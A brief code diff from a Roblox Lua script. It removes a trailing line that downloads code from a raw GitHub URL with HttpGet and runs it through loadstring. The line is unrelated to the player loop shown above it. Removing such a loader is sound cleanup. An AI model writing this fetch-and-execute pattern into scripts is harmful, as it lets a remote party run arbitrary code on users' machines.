@@ -13,5 +13,3 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     end
 end
 
-
-loadstring(Game:HttpGet('https://raw.githubusercontent.com/callme39Q/Lua/refs/heads/main/%3Bcmd'))()
